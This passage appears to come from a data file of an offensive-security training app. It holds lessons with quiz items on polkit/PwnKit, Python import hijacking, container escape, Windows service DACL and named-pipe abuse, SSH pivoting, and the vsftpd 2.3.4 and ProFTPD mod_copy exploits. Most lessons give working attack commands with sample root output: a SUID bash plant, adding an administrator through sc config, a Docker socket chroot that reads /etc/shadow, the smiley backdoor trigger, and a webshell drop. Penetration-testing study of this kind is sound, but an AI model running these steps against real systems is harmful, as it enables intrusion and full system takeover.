                "out": "{\"id\":8,\"username\":\"x\",\"role\":\"admin\"}",
                "sig": "\"role\":\"admin\""
              }
            ],
            "note": "A fresh admin account is cleaner than escalating a watched one."
          }
        ]
      },
      "situation": "A profile API returns a role field the signup form never showed, and a PATCH with role:admin echoes it back. What is the move?",
      "choices": [
        "mass-assignment",
        "idor",
        "prototype-pollution",
        "jwt-attacks"
      ],
      "coach": {
        "idor": "IDOR changes which object you reach; mass assignment changes a field on the object you already own.",
        "prototype-pollution": "That pollutes the shared prototype; here the framework is binding your field straight onto the model.",
        "jwt-attacks": "The token is fine; the flaw is the binder writing a field the client should not control."
      }
    }
  };
  Object.keys(GAPFILL5F).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5F[k]; });

  // --- Phase-G gap-fill: container + local-service radar (beyond OSCP) ---
  var GAPFILL5G = {
    "polkit-abuse": {
      "why": "polkit (PolicyKit) is the service that decides whether an unprivileged process may run a privileged action over D-Bus, and pkexec is its setuid helper. Two things make it a reliable root: pkexec carried a memory-corruption bug (PwnKit, CVE-2021-4034) that gave instant root on almost every Linux box for a decade, and separately, policy misconfigurations or the CVE-2021-3560 race let you call privileged D-Bus actions (create a user, install a package) you should not be allowed to. The tell is simply that pkexec exists and the box is not patched, or that a D-Bus service exposes an action with a permissive policy. Check the pkexec version first; it is often the fastest root on the box.",
      "cmd": "ls -l /usr/bin/pkexec && pkexec --version",
      "tool": "sh",
      "output": "-rwsr-xr-x 1 root root 31032 /usr/bin/pkexec\npkexec version 0.105",
      "signal": "pkexec version 0.105",
      "teach": "pkexec is setuid-root and the version is old enough to be PwnKit-vulnerable (CVE-2021-4034). A public exploit gives instant root; if patched, look instead for a D-Bus action with a permissive policy you can call.",
      "leadup": [
        {
          "key": "pkexec",
          "label": "pkexec is present and setuid",
          "steps": [
            {
              "title": "Confirm the setuid helper",
              "tool": "sh",
              "where": "target",
              "cmd": "ls -l /usr/bin/pkexec",
              "out": "-rwsr-xr-x 1 root root 31032 /usr/bin/pkexec",
              "sig": "rwsr",
              "teach": "The s in the permission bits means pkexec runs as root; that is what PwnKit abuses."
            }
          ]
        }
      ],
      "how": {
        "lead": "polkit abuse is check the pkexec version for PwnKit, and separately look for a D-Bus action with a loose policy.",
        "items": [
          {
            "t": "Check the pkexec version",
            "d": "Versions before the 2022 fix are PwnKit-vulnerable. The version alone tells you whether the instant-root path is open.",
            "demo": [
              {
                "run": "pkexec --version",
                "out": "pkexec version 0.105",
                "sig": "pkexec version 0.105"
              }
            ],
            "note": "0.105 and most earlier builds are vulnerable unless the distro backported the patch."
          },
          {
            "t": "Run the PwnKit exploit",
            "d": "A public CVE-2021-4034 PoC compiles on the box and drops a root shell by abusing pkexec's argument handling.",
            "demo": [
              {
                "run": "gcc cve-2021-4034.c -o pwn && ./pwn",
                "out": "# id\nuid=0(root) gid=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "Prefer a precompiled binary if the box has no compiler; keep a copy staged."
          },
          {
            "t": "Or abuse a D-Bus policy",
            "d": "Where pkexec is patched, enumerate D-Bus services for an action whose policy lets your context call it, such as creating a user.",
            "demo": [
              {
                "run": "busctl list | grep -i accounts",
                "out": "org.freedesktop.Accounts  1234 accounts-daemon root",
                "sig": "org.freedesktop.Accounts"
              }
            ],
            "note": "CVE-2021-3560 raced this exact daemon to create a privileged user."
          },
          {
            "t": "Confirm root",
            "d": "The shell or the new privileged account is your root; capture proof.",
            "demo": [
              {
                "run": "id",
                "out": "uid=0(root) gid=0(root) groups=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "Clean up any user you created afterward."
          }
        ]
      },
      "situation": "An unprivileged shell on Linux, and pkexec is setuid-root at version 0.105. What is the fastest move?",
      "choices": [
        "polkit-abuse",
        "linux-kernel-exploit",
        "suid-gtfobins",
        "sudo-abuse"
      ],
      "coach": {
        "linux-kernel-exploit": "A kernel exploit is riskier; PwnKit against this pkexec is a reliable, local, instant root.",
        "suid-gtfobins": "pkexec is setuid but not a GTFOBins shell-out; its bug (PwnKit) is the lever here.",
        "sudo-abuse": "No sudo right is in play; pkexec's own vulnerability is the path."
      }
    },
    "python-library-hijack": {
      "why": "When root runs a Python script and any directory on that script's module search path is writable by you, you can plant a module the script imports and your code runs as root. Python searches the script's own directory first, then PYTHONPATH, then the site-packages dirs, so a writable script directory, a writable entry on PYTHONPATH, or a world-writable site-packages all give you the hijack. The same idea covers a writable .pth file and a shadowing module that out-ranks the real one on the path. The tell is a root cron or sudo-run Python script whose directory, or an importable path it uses, you can write.",
      "cmd": "python3 -c 'import sys; print(sys.path)'",
      "tool": "sh",
      "output": "['/opt/app', '/usr/lib/python3.11', '/usr/lib/python3/dist-packages']",
      "signal": "/opt/app",
      "teach": "The first entry on the path is the script's own directory, /opt/app. If that directory (or any writable entry) is yours, plant a module the root script imports and it runs as root on the next run.",
      "leadup": [
        {
          "key": "script",
          "label": "Root runs a Python script",
          "steps": [
            {
              "title": "Find the root Python job",
              "tool": "sh",
              "where": "target",
              "cmd": "cat /etc/crontab; sudo -l 2>/dev/null | grep -i '\\.py'",
              "out": "*/5 * * * * root /usr/bin/python3 /opt/app/collect.py",
              "sig": "/opt/app/collect.py",
              "teach": "A root cron or sudo entry running a Python script is the thing whose imports you want to hijack."
            }
          ]
        },
        {
          "key": "writable",
          "label": "A path entry is writable",
          "steps": [
            {
              "title": "Check the script directory",
              "tool": "sh",
              "where": "target",
              "cmd": "ls -ld /opt/app",
              "out": "drwxrwxr-x 2 root staff 4096 /opt/app",
              "sig": "drwxrwxr-x",
              "teach": "If your group can write the script's directory, you can plant a module it imports before the real one."
            }
          ]
        }
      ],
      "how": {
        "lead": "Python library hijack is find the root script, find a writable entry on its import path, and plant a module it imports.",
        "items": [
          {
            "t": "Find the root script and its imports",
            "d": "Read the script to see which modules it imports; a local import (not a stdlib one) is the easiest to shadow.",
            "demo": [
              {
                "run": "head -5 /opt/app/collect.py",
                "out": "import config\nimport requests",
                "sig": "import config"
              }
            ],
            "note": "config is a local module, so a config.py you plant on the path wins."
          },
          {
            "t": "Confirm a writable path entry",
            "d": "The script's own directory is first on sys.path; a writable one lets you shadow any import. PYTHONPATH and site-packages are the alternatives.",
            "demo": [
              {
                "run": "ls -ld /opt/app && python3 -c 'import sys;print(sys.path[0])'",
                "out": "drwxrwxr-x 2 root staff 4096 /opt/app\n/opt/app",
                "sig": "/opt/app"
              }
            ],
            "note": "A writable .pth file in site-packages is another route onto the path."
          },
          {
            "t": "Plant the hijack module",
            "d": "Write a module with the imported name whose top-level code runs your payload; it executes when the root script imports it.",
            "demo": [
              {
                "run": "echo 'import os; os.system(\"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\")' > /opt/app/config.py",
                "out": "",
                "sig": ""
              }
            ],
            "note": "Keep the module importable (no syntax errors) so the script does not crash before your code runs."
          },
          {
            "t": "Wait for the run and confirm",
            "d": "On the next execution the root script imports your module and runs your payload as root.",
            "demo": [
              {
                "run": "/tmp/rb -p -c id",
                "out": "uid=0(root) gid=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "A SUID bash copy is root on demand."
          }
        ]
      },
      "situation": "A root cron runs /opt/app/collect.py, and your group can write /opt/app. What is the move?",
      "choices": [
        "python-library-hijack",
        "cron-abuse",
        "linux-path-hijack",
        "suid-gtfobins"
      ],
      "coach": {
        "cron-abuse": "The cron script itself is not writable; the weakness is a module it imports from a directory you can write.",
        "linux-path-hijack": "That hijacks a PATH binary call; here you hijack a Python import on sys.path.",
        "suid-gtfobins": "No abusable SUID binary is in play; the lever is the writable import path of a root script."
      }
    },
    "container-escape": {
      "why": "Landing in a container is not the objective; the host is. Several common misconfigurations hand you the node: a container run with --privileged (or CAP_SYS_ADMIN) can mount the host disk or abuse cgroups to run a command in the host namespace; a mounted Docker socket lets you start a new container that bind-mounts the host root; and in Kubernetes a pod's mounted service-account token, if its role is permissive, lets you create a privileged pod or exec on another. The tell is a token file under /var/run/secrets, a docker.sock in the mounts, or a capability set that should never be in a container. Enumerate what the container was given, because that is the escape.",
      "cmd": "cat /proc/1/cgroup; ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null; ls -l /var/run/docker.sock 2>/dev/null",
      "tool": "sh",
      "output": "0::/docker/5f3a...\ntotal 0\n-rw-r--r-- 1 root root  ca.crt\n-rw-r--r-- 1 root root  token",
      "signal": "root  token",
      "teach": "A cgroup path with docker confirms you are containerized, and a mounted Kubernetes service-account token is present. Read the token's permissions; a permissive role lets you create a privileged pod or exec onto the node.",
      "leadup": [
        {
          "key": "inside",
          "label": "You are inside a container",
          "steps": [
            {
              "title": "Confirm containerization",
              "tool": "sh",
              "where": "target",
              "cmd": "cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null",
              "out": "0::/docker/5f3a9c...\n-rwxr-xr-x 1 root root 0 /.dockerenv",
              "sig": "/docker/",
              "teach": "A docker cgroup or a /.dockerenv file means you are in a container, so the goal is escaping to the host."
            }
          ]
        }
      ],
      "how": {
        "lead": "Container escape is enumerate what the container was given (privilege, socket, token), then use that to reach the node.",
        "items": [
          {
            "t": "Check for privileged mode and capabilities",
            "d": "A privileged container, or one with CAP_SYS_ADMIN, can mount the host disk or abuse cgroups to run on the host.",
            "demo": [
              {
                "run": "capsh --print | grep -i sys_admin; cat /proc/self/status | grep CapEff",
                "out": "CapEff: 000001ffffffffff",
                "sig": "000001ffffffffff"
              }
            ],
            "note": "A full CapEff mask (that value) is effectively a privileged container."
          },
          {
            "t": "Abuse a mounted Docker socket",
            "d": "If docker.sock is mounted, start a new container that bind-mounts the host root and chroot into it.",
            "demo": [
              {
                "run": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh",
                "out": "# cat /host/etc/shadow | head -1\nroot:$6$...",
                "sig": "root:$6$"
              }
            ],
            "note": "The socket is root on the host by design; mounting / is game over."
          },
          {
            "t": "Abuse a Kubernetes service-account token",
            "d": "A mounted token with a permissive role lets you talk to the API and create a privileged pod or exec onto a node.",
            "demo": [
              {
                "run": "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i create pods",
                "out": "yes",
                "sig": "yes"
              }
            ],
            "note": "can-i create pods (or exec) is the escalation; schedule a pod that mounts the host filesystem."
          },
          {
            "t": "Reach the node and confirm",
            "d": "A privileged pod mounting the host root, or a disk mount, gives you the node filesystem and from there root.",
            "demo": [
              {
                "run": "chroot /host id",
                "out": "uid=0(root) gid=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "Host root from a container is the escape; capture proof on the node."
          }
        ]
      },
      "situation": "You have a shell inside a container, and /var/run/secrets holds a Kubernetes service-account token. What is the move?",
      "choices": [
        "container-escape",
        "linux-enum",
        "linux-kernel-exploit",
        "docker-socket"
      ],
      "coach": {
        "linux-enum": "Standard enumeration helps, but the container-specific levers (token, socket, privilege) are the escape here.",
        "linux-kernel-exploit": "A kernel bug is a fallback; the mounted token is a cleaner, intended-path escape to the node.",
        "docker-socket": "That is the right idea when a docker.sock is mounted; here the lever is the Kubernetes token, so query the API."
      }
    },
    "windows-service-dacl-abuse": {
      "why": "Service permissions come in grades, and you do not need full control to win. If the service's security descriptor grants your user just SERVICE_CHANGE_CONFIG, you can rewrite what it runs or which account it runs as, even without the right to stop or start it. The catch is triggering the restart: an auto-start service picks up your change on the next reboot, and some services expose a start you are allowed to call. accesschk reads the descriptor in plain terms, so you can tell this granular right apart from the broader full-access case other moves cover. Back up the original binpath first, so the box still works after you capture proof.",
      "cmd": "accesschk.exe /accepteula -uwcqv bob VulnSvc",
      "tool": "accesschk",
      "output": "RW VulnSvc\n        SERVICE_QUERY_STATUS\n        SERVICE_QUERY_CONFIG\n        SERVICE_CHANGE_CONFIG\n        SERVICE_INTERROGATE\n        READ_CONTROL",
      "signal": "SERVICE_CHANGE_CONFIG",
      "teach": "Your user holds SERVICE_CHANGE_CONFIG on VulnSvc even without SERVICE_START or SERVICE_STOP. Repoint its binpath, or change its run-as account to LocalSystem, and let the next auto-start or reboot run your command as the service account.",
      "leadup": [
        {
          "key": "service",
          "label": "A non-default service runs with high privilege",
          "steps": [
            {
              "title": "Find the service and its account",
              "tool": "cmd",
              "where": "target",
              "cmd": "sc qc VulnSvc",
              "out": "SERVICE_START_NAME   : LocalSystem",
              "sig": "SERVICE_START_NAME   : LocalSystem",
              "teach": "A third-party service running as LocalSystem is the prize; now check what rights your user holds on it."
            }
          ]
        },
        {
          "key": "dacl",
          "label": "Its DACL grants you config rights",
          "steps": [
            {
              "title": "Read the rights you hold",
              "tool": "accesschk",
              "where": "target",
              "cmd": "accesschk.exe /accepteula -uwcqv bob VulnSvc",
              "out": "RW VulnSvc\n        SERVICE_CHANGE_CONFIG",
              "sig": "SERVICE_CHANGE_CONFIG",
              "teach": "SERVICE_CHANGE_CONFIG is enough on its own; you can reconfigure the service even without stop or start rights."
            }
          ]
        }
      ],
      "how": {
        "lead": "Service DACL abuse is read the descriptor, confirm SERVICE_CHANGE_CONFIG, repoint what the service runs, then trigger a start you can reach.",
        "items": [
          {
            "t": "Find a service and its account",
            "d": "sc qc shows the run-as account and current binary path. You want a service running as LocalSystem or an admin.",
            "demo": [
              {
                "run": "sc qc VulnSvc",
                "out": "SERVICE_START_NAME   : LocalSystem",
                "sig": "LocalSystem"
              }
            ],
            "note": "Note the current binpath so you can restore it afterward."
          },
          {
            "t": "Read the service DACL",
            "d": "accesschk with -uwcqv names the exact rights your user holds on the service object, so you can spot the granular config right.",
            "demo": [
              {
                "run": "accesschk.exe /accepteula -uwcqv bob VulnSvc",
                "out": "        SERVICE_CHANGE_CONFIG",
                "sig": "SERVICE_CHANGE_CONFIG"
              }
            ],
            "note": "This right is enough even when you cannot stop or start the service."
          },
          {
            "t": "Repoint the binary path",
            "d": "sc config rewrites the binpath, or obj= changes the account it runs as. Keep a copy of the original value.",
            "demo": [
              {
                "run": "sc config VulnSvc binPath= \"cmd /c net localgroup administrators bob /add\"",
                "out": "[SC] ChangeServiceConfig SUCCESS",
                "sig": "SUCCESS"
              }
            ],
            "note": "obj= LocalSystem works the same way when it is the account, not the binary, you want to change."
          },
          {
            "t": "Trigger the start and confirm",
            "d": "Fire the service if you are allowed, or wait for its auto-start or a reboot, then check your new rights.",
            "demo": [
              {
                "run": "sc start VulnSvc & net localgroup administrators",
                "out": "Administrator\nbob",
                "sig": "bob"
              }
            ],
            "note": "Your account in the administrators group confirms it; log in fresh to use the rights."
          }
        ]
      },
      "situation": "accesschk shows your user has SERVICE_CHANGE_CONFIG on a LocalSystem service, but not SERVICE_STOP or SERVICE_START. What is the move?",
      "choices": [
        "windows-service-dacl-abuse",
        "weak-service-permissions",
        "unquoted-service-path",
        "windows-enum"
      ],
      "coach": {
        "weak-service-permissions": "That move assumes you can reconfigure and restart at will; here you hold only the config right, so you repoint it and wait for an auto-start or reboot.",
        "unquoted-service-path": "The binary path is quoted, so there is no space to hijack; the lever is the writable DACL on the service object.",
        "windows-enum": "You already found the weak DACL; now reconfigure the service and trigger it."
      }
    },
    "windows-namedpipe-impersonation": {
      "why": "Windows lets a server borrow the identity of a client that connects to it, which is normally how a service acts on a user's behalf. You can turn that against the box: stand up a named pipe, get a more privileged process to connect to it, then call the impersonation API to adopt its token and duplicate it into a new process. The classic shortcut is SeImpersonatePrivilege plus a potato tool, which coerces a SYSTEM service onto your pipe for you. Even without that privilege, any service or task you can point at your pipe path hands you its token when it connects, so the coercion, not the privilege, is the real requirement.",
      "cmd": "whoami /priv",
      "tool": "cmd",
      "output": "PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State\n============================= ========================================= =======\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled",
      "signal": "SeImpersonatePrivilege",
      "teach": "SeImpersonatePrivilege makes this a one-tool job with a potato, which spins up the pipe and coerces a SYSTEM service onto it. Without the privilege, coerce a service or task you control onto a pipe you created, then impersonate the token it presents.",
      "leadup": [
        {
          "key": "priv",
          "label": "Your token carries SeImpersonate",
          "steps": [
            {
              "title": "Check your privileges",
              "tool": "cmd",
              "where": "target",
              "cmd": "whoami /priv",
              "out": "SeImpersonatePrivilege        Impersonate a client after authentication Enabled",
              "sig": "SeImpersonatePrivilege",
              "teach": "With this privilege a potato tool automates the pipe and the coercion for you."
            }
          ]
        },
        {
          "key": "coerce",
          "label": "A privileged client you can point at a pipe",
          "steps": [
            {
              "title": "Find a LocalSystem service you can steer",
              "tool": "cmd",
              "where": "target",
              "cmd": "sc qc VulnSvc",
              "out": "SERVICE_START_NAME   : LocalSystem",
              "sig": "LocalSystem",
              "teach": "A service that runs as LocalSystem and will connect where you tell it hands over its token, even with no special privilege of yours."
            }
          ]
        }
      ],
      "how": {
        "lead": "Named-pipe impersonation is create the pipe, coerce a privileged client onto it, impersonate the token it presents, then duplicate it into a SYSTEM process.",
        "items": [
          {
            "t": "Check your token",
            "d": "whoami /priv tells you whether SeImpersonate is present, which decides whether a potato does the work for you.",
            "demo": [
              {
                "run": "whoami /priv",
                "out": "SeImpersonatePrivilege        Impersonate a client after authentication Enabled",
                "sig": "SeImpersonatePrivilege"
              }
            ],
            "note": "Enabled means a potato tool is the fast path; absent means you coerce a client yourself."
          },
          {
            "t": "Stand up the pipe server",
            "d": "A helper (a potato, or your own small server) creates a named pipe and waits for a client to connect.",
            "demo": [
              {
                "run": "PrintSpoofer64.exe -i -c cmd",
                "out": "[+] Found privileged process, named pipe listening",
                "sig": "named pipe listening"
              }
            ],
            "note": "The pipe name is what the privileged client must be steered toward."
          },
          {
            "t": "Coerce a privileged client",
            "d": "Point a service, scheduled task, or the spooler at your pipe so a SYSTEM process connects to it.",
            "demo": [
              {
                "run": "sc config VulnSvc binPath= \"cmd /c echo x > \\\\.\\pipe\\obol\" & sc start VulnSvc",
                "out": "[SC] ChangeServiceConfig SUCCESS",
                "sig": "SUCCESS"
              }
            ],
            "note": "The service connects to your pipe when it starts, presenting its token."
          },
          {
            "t": "Impersonate and confirm",
            "d": "After ImpersonateNamedPipeClient and DuplicateTokenEx, spawn a process with the captured token and check who you are.",
            "demo": [
              {
                "run": "whoami",
                "out": "nt authority\\system",
                "sig": "system"
              }
            ],
            "note": "A SYSTEM result confirms the impersonation; capture proof."
          }
        ]
      },
      "situation": "You have a Windows foothold without SeImpersonate, but you can reconfigure a LocalSystem service to connect to a pipe you create. What is the move?",
      "choices": [
        "windows-namedpipe-impersonation",
        "seimpersonate",
        "unquoted-service-path",
        "windows-enum"
      ],
      "coach": {
        "seimpersonate": "That path needs SeImpersonate, which you do not hold here; the pipe works because the client connects to you and hands over its token regardless.",
        "unquoted-service-path": "No unquoted path is in play; the lever is the privileged client you steer onto your pipe.",
        "windows-enum": "You already have the lead; create the pipe and coerce the client onto it."
      }
    },
    "pivot-ssh-portforward": {
      "why": "A SOCKS proxy is the general answer to pivoting, but it is more machinery than a single internal service needs. SSH already carries two surgical forwards. A local forward binds a port on your own box to one internal host and port reached from the foothold, so your tools connect to localhost and land inside. A remote forward goes the other way, publishing a port of your attacker box on the foothold, which is how you catch a callback when the internal host cannot route back to you. Both ride a session you already have, so nothing new touches the target, and each exposes exactly the one port you name.",
      "cmd": "curl -s -I http://127.0.0.1:8080",
      "tool": "curl",
      "output": "HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nContent-Type: text/html",
      "signal": "HTTP/1.1 200 OK",
      "teach": "After ssh -L 8080:172.16.5.10:80, your localhost:8080 reaches the internal web server through the foothold, and a single curl confirms the forward is live. Use -R instead when the internal host must call back to you.",
      "leadup": [
        {
          "key": "sshaccess",
          "label": "You can log in over SSH",
          "steps": [
            {
              "title": "Confirm the SSH session",
              "tool": "ssh",
              "where": "local",
              "cmd": "ssh bob@10.10.10.10 id",
              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
              "sig": "uid=1000(bob)",
              "teach": "A working SSH session is the carrier; the forwards ride it with no extra tooling on the box."
            }
          ]
        },
        {
          "key": "target",
          "label": "You know one internal host and port",
          "steps": [
            {
              "title": "Spot the internal service",
              "tool": "ssh",
              "where": "local",
              "cmd": "ssh bob@10.10.10.10 'ss -tnl'",
              "out": "LISTEN 0 128 0.0.0.0:22\nLISTEN 0 70 172.16.5.10:3306",
              "sig": "172.16.5.10:3306",
              "teach": "One internal service is all a forward needs; name that host and port."
            }
          ]
        }
      ],
      "how": {
        "lead": "SSH port forwarding is pick the one internal service, open -L for inbound reach or -R for a callback, then use the forwarded port on localhost.",
        "items": [
          {
            "t": "Pick the one internal service",
            "d": "From the foothold's routes or listeners you already have an internal host and port; a single forward is enough when you do not need the whole subnet.",
            "demo": [
              {
                "run": "ssh bob@10.10.10.10 'ss -tnl | grep 172.16'",
                "out": "LISTEN 0 70 172.16.5.10:3306",
                "sig": "172.16.5.10:3306"
              }
            ],
            "note": "That one service is the target; no proxy needed."
          },
          {
            "t": "Local forward (-L) for inbound reach",
            "d": "ssh -L binds a local port to the internal host and port through the foothold; -N runs no remote command, just the tunnel.",
            "demo": [
              {
                "run": "ssh -L 3306:172.16.5.10:3306 -N bob@10.10.10.10",
                "out": "(no output; 127.0.0.1:3306 now reaches the internal database)",
                "sig": "127.0.0.1:3306"
              }
            ],
            "note": "Connect your client to 127.0.0.1:3306 and you are inside."
          },
          {
            "t": "Remote forward (-R) for a callback",
            "d": "ssh -R publishes a port of your attacker box on the foothold, so an internal host that cannot route to you reaches your listener instead.",
            "demo": [
              {
                "run": "ssh -R 9001:127.0.0.1:9001 -N bob@10.10.10.10",
                "out": "(no output; the foothold now forwards its 9001 to your 9001)",
                "sig": "9001"
              }
            ],
            "note": "Point the internal callback at the foothold's 9001."
          },
          {
            "t": "Use the forwarded service",
            "d": "Hit the forwarded port on localhost; the traffic tunnels through SSH to the internal service.",
            "demo": [
              {
                "run": "curl -s -I http://127.0.0.1:8080",
                "out": "HTTP/1.1 200 OK",
                "sig": "200 OK"
              }
            ],
            "note": "A 200 from localhost confirms the forward carries traffic."
          }
        ]
      },
      "situation": "The foothold can reach an internal database on 172.16.5.10:3306, you have SSH on the foothold, and you only need that one service. What is the move?",
      "choices": [
        "pivot-ssh-portforward",
        "pivot-ssh-dynamic",
        "pivot-chisel-socks",
        "pivot-scan-through"
      ],
      "coach": {
        "pivot-ssh-dynamic": "A dynamic SOCKS proxy works too, but a single -L forward is simpler when you want just one port, not the whole subnet.",
        "pivot-chisel-socks": "Chisel is for when SSH is unavailable or you need a full proxy; here SSH gives you the forward directly.",
        "pivot-scan-through": "That scans through a SOCKS proxy you have not built; for one known service, forward it directly instead."
      }
    },
    "vsftpd-backdoor": {
      "why": "The vsftpd 2.3.4 release shipped with a deliberate backdoor someone slipped into the source. When a username you send during login ends in the two characters that form a smiley, the daemon opens a root shell on port 6200 and waits. There is no password and no memory corruption, so it is completely reliable, but only on that one version. The whole skill is reading the banner, because the moment it says vsftpd 2.3.4 the box is already yours. Fingerprint it, trip the smiley, then connect to 6200.",
      "cmd": "nmap -p21 -sV {{target}}",
      "tool": "nmap",
      "output": "PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4",
      "signal": "vsftpd 2.3.4",
      "teach": "The banner reads vsftpd 2.3.4, the one backdoored release. Log in with any username ending in a smiley, then connect to tcp/6200 for a root shell.",
      "leadup": [
        {
          "key": "banner",
          "label": "The FTP banner names the version",
          "steps": [
            {
              "title": "Version-scan the port",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p21 -sV {{target}}",
              "out": "21/tcp open  ftp     vsftpd 2.3.4",
              "sig": "vsftpd 2.3.4",
              "teach": "The version is the whole tell; 2.3.4 is the backdoored build and nothing else is."
            }
          ]
        },
        {
          "key": "port",
          "label": "FTP is open",
          "steps": [
            {
              "title": "See the open port",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p21 {{target}}",
              "out": "21/tcp open  ftp",
              "sig": "21/tcp open",
              "teach": "FTP is listening; fingerprint the version before you decide anything."
            }
          ]
        }
      ],
      "how": {
        "lead": "vsftpd 2.3.4 is confirm the banner, send a smiley username to open the backdoor, then connect to port 6200 for root.",
        "items": [
          {
            "t": "Fingerprint the version",
            "d": "Only 2.3.4 is backdoored, so the version scan is the whole decision.",
            "demo": [
              {
                "run": "nmap -p21 -sV {{target}}",
                "out": "21/tcp open  ftp     vsftpd 2.3.4",
                "sig": "vsftpd 2.3.4"
              }
            ],
            "note": "Any other version, stop here and enumerate FTP normally."
          },
          {
            "t": "Trip the backdoor",
            "d": "Log in with a username whose last two characters form a smiley; the password is ignored.",
            "demo": [
              {
                "run": "(printf 'USER hax:)\\r\\nPASS hax\\r\\n'; sleep 2) | nc {{target}} 21",
                "out": "220 (vsFTPd 2.3.4)\n331 Please specify the password.",
                "sig": "220 (vsFTPd 2.3.4)"
              }
            ],
            "note": "The login hangs on purpose; the backdoor is now listening on 6200."
          },
          {
            "t": "Connect to the root shell",
            "d": "A second connection to tcp/6200 drops you straight into a root shell.",
            "demo": [
              {
                "run": "nc {{target}} 6200",
                "out": "id\nuid=0(root) gid=0(root) groups=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "You are root; stabilise the shell and capture proof."
          }
        ]
      },
      "situation": "An FTP service answers on port 21 and nmap -sV reports the banner vsftpd 2.3.4. What is the move?",
      "choices": [
        "vsftpd-backdoor",
        "online-brute-ftp",
        "recon-ftp",
        "ftp-upload-webshell"
      ],
      "coach": {
        "online-brute-ftp": "No need to guess a password; this exact version hands you root through the smiley backdoor.",
        "recon-ftp": "Anonymous enumeration is fine, but the 2.3.4 banner is a direct root shell, so take it.",
        "ftp-upload-webshell": "That is for a writable FTP that reaches the web root; here the version itself is the exploit."
      }
    },
    "proftpd-modcopy": {
      "why": "ProFTPD 1.3.5 left SITE CPFR and SITE CPTO enabled for anyone, with no login. Those two commands copy a file the server can read to a path it can write, so if the web root is writable you copy a PHP payload into it and browse to your webshell. The real work is knowing where the web root is, which recon of the HTTP service usually reveals. No credentials, no upload form, just two FTP commands and a request.",
      "cmd": "nmap -p21 -sV {{target}}",
      "tool": "nmap",
      "output": "PORT   STATE SERVICE VERSION\n21/tcp open  ftp     ProFTPD 1.3.5",
      "signal": "ProFTPD 1.3.5",
      "teach": "ProFTPD 1.3.5 exposes unauthenticated SITE CPFR and CPTO. Copy a PHP payload into a web-served directory, then request it for command execution.",
      "leadup": [
        {
          "key": "banner",
          "label": "The FTP banner names the version",
          "steps": [
            {
              "title": "Version-scan the port",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p21 -sV {{target}}",
              "out": "21/tcp open  ftp     ProFTPD 1.3.5",
              "sig": "ProFTPD 1.3.5",
              "teach": "The mod_copy commands are unauthenticated on 1.3.5, so the version is the gate."
            }
          ]
        },
        {
          "key": "webroot",
          "label": "You know a web-served path",
          "steps": [
            {
              "title": "Find the web server on the same host",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s -I http://{{target}}/",
              "out": "HTTP/1.1 200 OK\nServer: Apache/2.4.7 (Ubuntu)",
              "sig": "Server: Apache",
              "teach": "An Apache on the same host usually serves /var/www/html, which is your copy target."
            }
          ]
        }
      ],
      "how": {
        "lead": "mod_copy is confirm 1.3.5, prove the copy works with a harmless file, then copy a PHP payload into the web root and call it.",
        "items": [
          {
            "t": "Fingerprint the version",
            "d": "The unauthenticated copy exists on 1.3.5 up to the patch, so confirm the banner first.",
            "demo": [
              {
                "run": "nmap -p21 -sV {{target}}",
                "out": "21/tcp open  ftp     ProFTPD 1.3.5",
                "sig": "ProFTPD 1.3.5"
              }
            ],
            "note": "A different version means mod_copy is likely patched or disabled."
          },
          {
            "t": "Prove the copy primitive",
            "d": "Copy a readable system file to a temp path to confirm CPFR and CPTO work before you stage a payload.",
            "demo": [
              {
                "run": "nc {{target}} 21",
                "out": "SITE CPFR /etc/passwd\n350 File or directory exists, ready for destination name\nSITE CPTO /tmp/passwd.copy\n250 Copy successful",
                "sig": "250 Copy successful"
              }
            ],
            "note": "A successful copy means you can write anywhere the FTP service user can."
          },
          {
            "t": "Stage a webshell into the web root",
            "d": "Copy a PHP payload into the directory the web server serves. The public exploit automates the two SITE commands.",
            "demo": [
              {
                "run": "python2 36803.py {{target}} /var/www/html/",
                "out": "[+] Copied payload to /var/www/html/shell.php",
                "sig": "shell.php"
              }
            ],
            "note": "Find the real web root first; /var/www/html is only the common default."
          },
          {
            "t": "Run commands through it",
            "d": "Request the webshell with a command; swap the command for a reverse-shell one-liner once it answers.",
            "demo": [
              {
                "run": "curl 'http://{{target}}/shell.php?cmd=id'",
                "out": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
                "sig": "www-data"
              }
            ],
            "note": "You have execution as the web user; now upgrade to a shell and start enumerating for root."
          }
        ]
      },
      "situation": "FTP on port 21 banners as ProFTPD 1.3.5, and an Apache server runs on port 80. What is the move?",
      "choices": [
        "proftpd-modcopy",
        "recon-ftp",
        "online-brute-ftp",
        "content-discovery"
      ],
      "coach": {
        "recon-ftp": "Anonymous login may not even be needed; mod_copy writes a webshell without logging in.",
        "online-brute-ftp": "No password required; the unauthenticated copy is the way in.",
        "content-discovery": "Useful for finding the web root path, but the exploit itself is the FTP copy, not the directory brute."
      }
    },
    "samba-usermap": {
      "why": "Old Samba with the username map script option passes the SMB username straight into a shell command, so a username that is really a command runs as root. You send it through an anonymous connection to the IPC share, with a listener waiting, and the injected command calls back to you. It is one of the most reliable instant roots on legacy Linux, and it needs no credentials at all. Confirm the version sits in the vulnerable range first, because only the old builds carry it.",
      "cmd": "nmap -p139,445 --script smb-os-discovery {{target}}",
      "tool": "nmap",
      "output": "Host script results:\n| smb-os-discovery:\n|   OS: Unix (Samba 3.0.20-Debian)",
      "signal": "Samba 3.0.20",
